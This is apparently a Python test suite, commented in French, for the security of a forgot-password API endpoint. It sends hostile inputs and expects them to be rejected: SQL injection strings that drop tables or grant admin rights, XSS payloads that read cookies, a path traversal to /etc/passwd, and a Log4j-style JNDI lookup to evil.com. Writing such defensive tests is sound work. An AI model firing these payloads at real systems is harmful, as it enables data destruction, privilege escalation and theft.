#!/usr/bin/env python3

import json
import unittest
from app.tests.base_test import BaseTest
from app.api.v1.authentication import api as auth_api
from app.api.v1.users import api as users_api
from app.models.user import User


class TestUsersForgotPasswordSecurity(BaseTest):
    """Tests de sécurité pour la fonctionnalité mot de passe oublié - API"""

    def setUp(self):
        super().setUp()
        self.api = self.create_test_api('Main')
        self.api.add_namespace(auth_api, path='/auth')
        self.api.add_namespace(users_api, path='/users')
        self.client = self.app.test_client()

        # Créer utilisateur de test
        self.test_user = User(
            first_name='Test',
            last_name='User',
            email='test@example.com',
            password='Password123!',
            is_admin=False
        )
        self.save_to_db(self.test_user)

    def test_forgot_password_sql_injection_protection(self):
        """Test protection contre injection SQL"""
        malicious_emails = [
            "'; DROP TABLE users; --",
            "test@example.com'; DELETE FROM users; --",
            "admin' OR '1'='1",
            "test@example.com' UNION SELECT * FROM users --",
            "test@example.com'; UPDATE users SET is_admin=1; --"
        ]
        
        for malicious_email in malicious_emails:
            data = {'email': malicious_email}
            
            response = self.client.post(
                '/users/forgot-password',
                data=json.dumps(data),
                content_type='application/json'
            )
            
            # Doit échouer avec validation (400) ou not found (404), pas avec erreur SQL
            self.assertIn(response.status_code, [400, 404])
            
            # Vérifier qu'il n'y a pas de fuite d'informations SQL
            if response.data and response.content_type == 'application/json':
                response_data = json.loads(response.data)
                if 'error' in response_data:
                    error_msg = response_data['error'].lower()
                    sql_terms = ['sql', 'database', 'table', 'query', 'select', 'drop', 'update']
                    for term in sql_terms:
                        self.assertNotIn(term, error_msg)

    def test_forgot_password_xss_protection(self):
        """Test protection contre XSS"""
        xss_payloads = [
            "<script>alert('xss')</script>@example.com",
            "test@<script>alert('xss')</script>.com",
            "javascript:alert('xss')@example.com",
            "<img src=x onerror=alert('xss')>@example.com",
            "test@example.com<script>document.cookie</script>"
        ]
        
        for xss_payload in xss_payloads:
            data = {'email': xss_payload}
            
            response = self.client.post(
                '/users/forgot-password',
                data=json.dumps(data),
                content_type='application/json'
            )
            
            # Doit échouer avec validation
            self.assertIn(response.status_code, [400, 404])
            
            # Vérifier que la réponse ne contient pas le payload
            if response.data:
                response_text = response.data.decode()
                self.assertNotIn('<script>', response_text)
                self.assertNotIn('javascript:', response_text)

    def test_forgot_password_rate_limiting_simulation(self):
        """Test simulation de limitation de taux"""
        data = {'email': 'test@example.com'}
        
        # Faire plusieurs requêtes rapidement
        responses = []
        for i in range(10):
            response = self.client.post(
                '/users/forgot-password',
                data=json.dumps(data),
                content_type='application/json'
            )
            responses.append(response.status_code)
        
        # Toutes doivent réussir (pas de limitation implémentée actuellement)
        for status_code in responses:
            self.assertEqual(status_code, 200)

    def test_forgot_password_information_disclosure(self):
        """Test pas de fuite d'informations"""
        # Test avec email existant
        data_existing = {'email': 'test@example.com'}
        response_existing = self.client.post(
            '/users/forgot-password',
            data=json.dumps(data_existing),
            content_type='application/json'
        )
        
        # Test avec email inexistant
        data_nonexistent = {'email': 'nonexistent@example.com'}
        response_nonexistent = self.client.post(
            '/users/forgot-password',
            data=json.dumps(data_nonexistent),
            content_type='application/json'
        )
        
        # Les réponses ne doivent pas révéler si l'email existe ou non
        # (selon l'implémentation, peut retourner 200 dans les deux cas pour éviter l'énumération)
        self.assertIn(response_existing.status_code, [200, 404])
        self.assertIn(response_nonexistent.status_code, [200, 404])

    def test_forgot_password_email_enumeration_protection(self):
        """Test protection contre énumération d'emails"""
        emails_to_test = [
            'test@example.com',  # Existant
            'nonexistent@example.com',  # Inexistant
            'admin@example.com',  # Inexistant
            'user@test.com'  # Inexistant
        ]
        
        responses = []
        for email in emails_to_test:
            data = {'email': email}
            response = self.client.post(
                '/users/forgot-password',
                data=json.dumps(data),
                content_type='application/json'
            )
            responses.append((email, response.status_code, response.data))
        
        # Analyser les réponses pour détecter des patterns d'énumération
        existing_response = next(r for r in responses if r[0] == 'test@example.com')
        nonexistent_responses = [r for r in responses if r[0] != 'test@example.com']
        
        # Selon la stratégie de sécurité, les réponses peuvent être identiques ou différentes
        # L'important est qu'il n'y ait pas de fuite d'informations détaillées
        for email, status_code, data in responses:
            self.assertIn(status_code, [200, 404])

    def test_forgot_password_input_validation_security(self):
        """Test validation stricte des entrées"""
        malicious_inputs = [
            {'email': 'a' * 1000 + '@example.com'},  # Très long
            {'email': '\x00test@example.com'},  # Caractère null
            {'email': 'test@example.com\n\r'},  # Caractères de contrôle
            {'email': '../../../etc/passwd'},  # Path traversal
            {'email': '${jndi:ldap://evil.com/a}'},  # Log4j style
            {'email': '%50%45%4E%44%49%4E%47'},  # URL encoded
        ]
        
        for malicious_input in malicious_inputs:
            response = self.client.post(
                '/users/forgot-password',
                data=json.dumps(malicious_input),
                content_type='application/json'
            )
            
            # Doit échouer avec validation
            self.assertIn(response.status_code, [400, 404])

    def test_forgot_password_csrf_protection(self):
        """Test protection CSRF (pas de token requis pour cette route publique)"""
        data = {'email': 'test@example.com'}
        
        # Test sans headers CSRF
        response = self.client.post(
            '/users/forgot-password',
            data=json.dumps(data),
            content_type='application/json'
        )
        
        # Doit réussir car c'est une route publique
        self.assertEqual(response.status_code, 200)

    def test_forgot_password_content_type_validation(self):
        """Test validation du Content-Type"""
        data = {'email': 'test@example.com'}
        
        # Test avec différents Content-Types
        content_types = [
            'application/json',  # Valide
            'text/plain',  # Invalide
            'application/x-www-form-urlencoded',  # Invalide
            'multipart/form-data',  # Invalide
            'text/html'  # Invalide
        ]
        
        for content_type in content_types:
            response = self.client.post(
                '/users/forgot-password',
                data=json.dumps(data) if content_type == 'application/json' else str(data),
                content_type=content_type
            )
            
            if content_type == 'application/json':
                self.assertEqual(response.status_code, 200)
            else:
                self.assertIn(response.status_code, [400, 415])

    def test_forgot_password_concurrent_requests(self):
        """Test requêtes concurrentes"""
        data = {'email': 'test@example.com'}
        
        # Simuler des requêtes concurrentes
        responses = []
        for i in range(5):
            response = self.client.post(
                '/users/forgot-password',
                data=json.dumps(data),
                content_type='application/json'
            )
            responses.append(response.status_code)
        
        # Toutes doivent réussir
        for status_code in responses:
            self.assertEqual(status_code, 200)

    def test_forgot_password_error_message_security(self):
        """Test sécurité des messages d'erreur"""
        test_cases = [
            {'email': ''},  # Email vide
            {'email': 'invalid'},  # Format invalide
            {},  # Pas d'email
            {'email': None}  # Email null
        ]
        
        for data in test_cases:
            response = self.client.post(
                '/users/forgot-password',
                data=json.dumps(data),
                content_type='application/json'
            )
            
            self.assertEqual(response.status_code, 400)
            
            if response.data and response.content_type == 'application/json':
                response_data = json.loads(response.data)
                if 'error' in response_data:
                    error_msg = response_data['error'].lower()
                    
                    # Vérifier qu'il n'y a pas de fuite d'informations sensibles
                    sensitive_terms = ['sql', 'database', 'internal', 'stack', 'trace', 'exception']
                    for term in sensitive_terms:
                        self.assertNotIn(term, error_msg)

    def test_forgot_password_timing_attack_protection(self):
        """Test protection contre attaques de timing"""
        import time
        
        # Test avec email existant
        start_time = time.time()
        data_existing = {'email': 'test@example.com'}
        response_existing = self.client.post(
            '/users/forgot-password',
            data=json.dumps(data_existing),
            content_type='application/json'
        )
        existing_time = time.time() - start_time
        
        # Test avec email inexistant
        start_time = time.time()
        data_nonexistent = {'email': 'nonexistent@example.com'}
        response_nonexistent = self.client.post(
            '/users/forgot-password',
            data=json.dumps(data_nonexistent),
            content_type='application/json'
        )
        nonexistent_time = time.time() - start_time
        
        # Les temps de réponse ne doivent pas révéler d'informations
        # (test approximatif, peut varier selon l'implémentation)
        time_difference = abs(existing_time - nonexistent_time)
        # Accepter une différence raisonnable (moins de 1 seconde)
        self.assertLess(time_difference, 1.0)


if __name__ == '__main__':
    unittest.main()